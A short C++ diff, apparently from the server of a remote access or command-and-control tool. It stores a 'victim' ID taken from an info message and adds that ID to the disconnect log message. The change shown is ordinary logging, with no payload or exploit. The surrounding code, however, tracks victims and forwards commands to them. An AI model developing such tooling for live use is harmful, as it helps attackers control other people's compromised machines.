@@ -261,7 +261,10 @@ private:
                         }
 
                         if (vuMsg[0] == "info")
+                        {
+                            szVictimID = vuMsg[4];
                             victim->m_szVictimID = vuMsg[4];
+                        }
 
                         m_vicParent->fnSendCommand(decoded);
                     }
@@ -305,7 +308,7 @@ private:
                 );
             }
 
-            clsTools::fnLogInfo("Client disconnected");
+            clsTools::fnLogInfo("Client disconnected: " + szVictimID);
         }
         catch (const std::exception& e)
         {
